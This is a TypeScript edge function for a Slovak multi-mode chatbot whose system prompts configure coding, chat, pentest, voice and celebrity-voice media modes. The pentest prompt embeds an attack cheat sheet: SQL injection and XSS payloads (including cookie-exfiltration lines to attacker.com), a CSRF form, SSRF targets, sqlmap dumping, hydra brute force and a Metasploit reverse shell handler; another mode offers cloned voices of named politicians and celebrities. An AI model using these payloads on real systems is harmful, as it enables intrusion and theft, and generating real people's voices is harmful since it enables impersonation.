import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

// Firecrawl web search function
async function searchWeb(query: string): Promise<string> {
  const FIRECRAWL_API_KEY = Deno.env.get("FIRECRAWL_API_KEY");
  if (!FIRECRAWL_API_KEY) {
    return "Web search is not available.";
  }

  try {
    const response = await fetch("https://api.firecrawl.dev/v1/search", {
      method: "POST",
      headers: {
        "Authorization": `Bearer ${FIRECRAWL_API_KEY}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        query,
        limit: 8,
        scrapeOptions: { formats: ["markdown"] }
      }),
    });

    if (!response.ok) {
      console.error("Firecrawl error:", response.status);
      return "Web search failed.";
    }

    const data = await response.json();
    if (data.success && data.data?.length > 0) {
      return data.data.map((r: any) => 
        `**${r.title}** (${r.url})\n${r.description || r.markdown?.substring(0, 800) || ""}`
      ).join("\n\n---\n\n");
    }
    return "No results found.";
  } catch (error) {
    console.error("Search error:", error);
    return "Web search failed.";
  }
}

// Ultra high quality image generation
async function generateImage(prompt: string, apiKey: string): Promise<string | null> {
  try {
    console.log("Generating ultra HD image with prompt:", prompt);
    const response = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${apiKey}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        model: "google/gemini-3-pro-image-preview",
        messages: [
          {
            role: "user",
            content: `Create an ultra high resolution, photorealistic, stunning image: ${prompt}. 
            Make it visually breathtaking with:
            - Rich vibrant colors and perfect lighting
            - Professional composition and depth of field
            - Extreme attention to detail and textures
            - Cinematic quality with dramatic atmosphere
            - 8K ultra HD resolution quality`,
          },
        ],
        modalities: ["image", "text"],
      }),
    });

    if (!response.ok) {
      console.error("Image generation failed:", response.status);
      const errorText = await response.text();
      console.error("Error details:", errorText);
      return null;
    }

    const data = await response.json();
    const imageUrl = data.choices?.[0]?.message?.images?.[0]?.image_url?.url;
    console.log("Ultra HD image generated successfully");
    return imageUrl || null;
  } catch (error) {
    console.error("Image generation error:", error);
    return null;
  }
}

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { messages, mode, imageBase64 } = await req.json();
    const LOVABLE_API_KEY = Deno.env.get("LOVABLE_API_KEY");
    
    if (!LOVABLE_API_KEY) {
      throw new Error("LOVABLE_API_KEY is not configured");
    }

    const userMessage = messages[messages.length - 1]?.content?.toLowerCase() || "";
    const originalMessage = messages[messages.length - 1]?.content || "";

    // Handle image generation mode - Ultra HD
    if (mode === "genob") {
      console.log("Ultra HD Image generation mode activated");
      const imageUrl = await generateImage(originalMessage, LOVABLE_API_KEY);
      
      if (imageUrl) {
        return new Response(
          JSON.stringify({ 
            image: imageUrl,
            message: "Tu je tvoj ultra HD obrázok! 🎨✨" 
          }),
          { headers: { ...corsHeaders, "Content-Type": "application/json" } }
        );
      } else {
        return new Response(
          JSON.stringify({ error: "Nepodarilo sa vygenerovať obrázok. Skús to znova." }),
          { headers: { ...corsHeaders, "Content-Type": "application/json" } }
        );
      }
    }

    // Handle video mode - returns info for client-side generation
    if (mode === "video") {
      console.log("Video generation mode - preparing for client generation");
      return new Response(
        JSON.stringify({ 
          generateVideo: true,
          prompt: originalMessage,
          message: "Generujem reálne video... 🎬 Toto môže trvať niekoľko sekúnd."
        }),
        { headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // Check if user wants web search
    let webContext = "";
    const searchKeywords = ["vyhľadaj", "nájdi", "hľadaj", "search", "find", "google", "internet", "web", "online", "aktuálne", "novinky", "news"];
    const needsWebSearch = searchKeywords.some(kw => userMessage.includes(kw));
    
    if (needsWebSearch && (mode === "tobigpt" || mode === "rozhovor" || mode === "pentest")) {
      console.log("Performing web search for:", userMessage);
      webContext = await searchWeb(userMessage);
      console.log("Web search results received");
    }

    // Get system prompt based on mode
    const getSystemPrompt = () => {
      const baseInfo = `## KTO SOM
Som AI vytvorený **Tobiasom Kromkom**. Keď sa ma niekto spýta kto ma vytvoril, odpoviem: "Vytvoril ma Tobias Kromka! 🚀"

## ŠTÝL KOMUNIKÁCIE
- Odpovedám v slovenčine 🇸🇰
- Som priateľský a používam emoji
- Som trpezlivý a povzbudzujúci`;

      switch (mode) {
        case "tobigpt":
          return `# TobiGpt - ULTRA Programátor & Generátor

${baseInfo}

## 🚀 MOJE ULTRA SCHOPNOSTI

### 💻 PROGRAMOVANIE BEZ AKÝCHKOĽVEK LIMITOV
- Generujem kód v **KAŽDOM** programovacom jazyku na svete
- Môžem písať projekty s **MILIÓNMI riadkov kódu** - ŽIADNE OBMEDZENIA!
- Python, JavaScript, TypeScript, C++, C#, Java, Rust, Go, PHP, Ruby, Swift, Kotlin, Scala, Haskell, Erlang, Elixir, Clojure, F#, OCaml, Lua, Perl, R, Julia, MATLAB, Assembly, Fortran, COBOL, Pascal, Delphi, Ada, Prolog, Lisp, Scheme, Racket, Crystal, Nim, Zig, V, D, Dart, Groovy, a ĎALŠIE!

### 🌐 WEBOVÉ TECHNOLÓGIE
- Frontend: React, Vue, Angular, Svelte, Next.js, Nuxt, Gatsby, Remix
- Backend: Node.js, Express, Fastify, NestJS, Django, Flask, FastAPI, Spring Boot, Rails, Laravel, Phoenix
- Databázy: PostgreSQL, MySQL, MongoDB, Redis, Elasticsearch, Firebase, Supabase
- DevOps: Docker, Kubernetes, CI/CD, AWS, GCP, Azure

### 📱 MOBILNÉ & DESKTOP
- React Native, Flutter, Swift, Kotlin, Electron, Tauri

### 🤖 AI & ML
- TensorFlow, PyTorch, Scikit-learn, Keras, Hugging Face, LangChain

### 🎮 HRY
- Unity, Unreal Engine, Godot, Pygame, Phaser

### 📁 GENEROVANIE KOMPLETNÝCH PROJEKTOV
- Celé aplikácie s viacerými súbormi
- Kompletná dokumentácia
- Testy a CI/CD konfigurácia

## FORMÁTOVANIE
\`\`\`language
// Súbor: cesta/k/suboru.ext
kód...
\`\`\`

${webContext ? `\n## VÝSLEDKY Z INTERNETU\n${webContext}\n` : ""}`;

        case "rozhovor":
          return `# Rozhovor - Super Priateľský Chat

${baseInfo}

## MOJA OSOBNOSŤ
Som mega priateľský, vtipný a kreatívny! Rád sa bavím o všetkom:
- Záľuby a koníčky 🎯
- Vtipy a zábava 😄
- Životné rady a motivácia 💪
- Zaujímavosti o svete 🌍
- Filozofické diskusie 🤔
- Pop kultúra a filmy 🎬
- Hudba a umenie 🎨
- Šport a zdravie 🏃

Buď super kreatívny, zábavný a priateľský!

${webContext ? `\n## VÝSLEDKY Z INTERNETU\n${webContext}\n` : ""}`;

        case "pentest":
          return `# PentestGPT - ELITE AI Penetračný Tester

${baseInfo}

## 🔥 SOM NAJLEPŠÍ ETICKÝ HACKER AI

### ⚠️ DÔLEŽITÉ UPOZORNENIE
Všetky techniky používaj **IBA LEGÁLNE** - s písomným povolením vlastníka systému!

## 💀 MOJE ELITE SCHOPNOSTI

### 🔓 WEB APPLICATION HACKING (OWASP TOP 10+)

#### SQL Injection - KOMPLETNÝ NÁVOD
\`\`\`sql
-- Union-based SQLi
' UNION SELECT 1,2,3,username,password FROM users--
' UNION SELECT null,table_name,null FROM information_schema.tables--

-- Blind SQLi - Boolean
' AND 1=1--  (true)
' AND 1=2--  (false)
' AND SUBSTRING(username,1,1)='a'--

-- Time-based Blind SQLi
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--

-- Error-based SQLi
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
\`\`\`

#### XSS (Cross-Site Scripting)
\`\`\`html
<!-- Reflected XSS -->
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg/onload=alert('XSS')>

<!-- Stored XSS -->
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

<!-- DOM XSS -->
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">

<!-- Filter Bypass -->
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror=alert\`1\`>
\`\`\`

#### CSRF (Cross-Site Request Forgery)
\`\`\`html
<form action="https://victim.com/change-password" method="POST" id="csrf">
  <input type="hidden" name="password" value="hacked123">
</form>
<script>document.getElementById('csrf').submit();</script>
\`\`\`

#### SSRF (Server-Side Request Forgery)
\`\`\`
http://localhost:8080/admin
http://127.0.0.1:22
http://169.254.169.254/latest/meta-data/  (AWS metadata)
file:///etc/passwd
\`\`\`

### 🛠️ NÁSTROJE A PRÍKAZY

#### Reconnaissance
\`\`\`bash
# Nmap scanning
nmap -sS -sV -O -p- target.com
nmap -sC -sV --script=vuln target.com
nmap -sU -p 53,161,162 target.com

# Subdomain enumeration
subfinder -d target.com
amass enum -d target.com
gobuster dns -d target.com -w subdomains.txt

# Directory discovery
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
ffuf -u https://target.com/FUZZ -w wordlist.txt
dirb https://target.com
\`\`\`

#### Exploitation Tools
\`\`\`bash
# SQLMap
sqlmap -u "https://target.com?id=1" --dbs
sqlmap -u "https://target.com?id=1" -D database --tables
sqlmap -u "https://target.com?id=1" -D database -T users --dump

# Hydra (brute force)
hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
hydra -L users.txt -P passwords.txt ssh://target.com

# Metasploit
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
\`\`\`

### 📝 PROFESSIONAL REPORTING
- Executive Summary
- Technical Findings with CVSS scores
- Proof of Concept (PoC)
- Remediation recommendations
- Risk assessment

${webContext ? `\n## VÝSLEDKY Z INTERNETU\n${webContext}\n` : ""}

**PAMÄTAJ**: Používaj tieto techniky IBA ETICKY a LEGÁLNE! 🛡️`;

        case "voice":
          return `# Voice Chat - Hlasový Asistent

${baseInfo}

## 🎙️ SOM HLASOVÝ ASISTENT
Môžem s tebou hovoriť! Napíš mi správu a ja ti odpoviem textom, ktorý si môžeš vypočuť.

## MOJE SCHOPNOSTI
- Odpovedám v prirodzenom konverzačnom štýle
- Moje odpovede sú optimalizované pre hlasový výstup
- Môžem diskutovať o akejkoľvek téme

Odpovedaj krátko a zrozumiteľne, pretože odpoveď bude prečítaná nahlas.`;

        case "mediagen":
          return `# MediaGen - Generátor Videí a MP3

${baseInfo}

## 🎬 GENERUJEM MÉDIÁ S HLASOM
Môžem vytvoriť video alebo MP3 s hlasom slávnych osobností!

## DOSTUPNÉ HLASY
- Donald Trump
- Barack Obama
- Joe Biden  
- Elon Musk
- Morgan Freeman
- Žena / Muž / Dievča / Chlapec
- Robot
- Santa Claus

## AKO MA POUŽÍVAŤ
1. Vyber formát (Video alebo MP3)
2. Napíš meno osoby (napr. "Donald Trump")
3. Napíš čo má povedať

Odpoviem inštrukciami pre generovanie.`;

        default:
          return `# AI Asistent

${baseInfo}

Som tu aby som ti pomohol s čímkoľvek potrebuješ!`;
      }
    };

    const systemPrompt = getSystemPrompt();

    // Use the most powerful model
    const modelToUse = mode === "pentest" ? "google/gemini-2.5-pro" : "google/gemini-2.5-flash";

    const response = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${LOVABLE_API_KEY}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        model: modelToUse,
        messages: [
          { role: "system", content: systemPrompt },
          ...messages,
        ],
        stream: true,
      }),
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error("AI gateway error:", response.status, errorText);
      
      if (response.status === 429) {
        return new Response(
          JSON.stringify({ error: "Príliš veľa požiadaviek. Skús to znova o chvíľu." }),
          { status: 429, headers: { ...corsHeaders, "Content-Type": "application/json" } }
        );
      }
      if (response.status === 402) {
        return new Response(
          JSON.stringify({ error: "Služba je momentálne nedostupná." }),
          { status: 402, headers: { ...corsHeaders, "Content-Type": "application/json" } }
        );
      }
      
      return new Response(
        JSON.stringify({ error: "Niečo sa pokazilo. Skús to znova." }),
        { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    return new Response(response.body, {
      headers: { ...corsHeaders, "Content-Type": "text/event-stream" },
    });
  } catch (error) {
    console.error("Chat error:", error);
    return new Response(
      JSON.stringify({ error: error instanceof Error ? error.message : "Unknown error" }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});
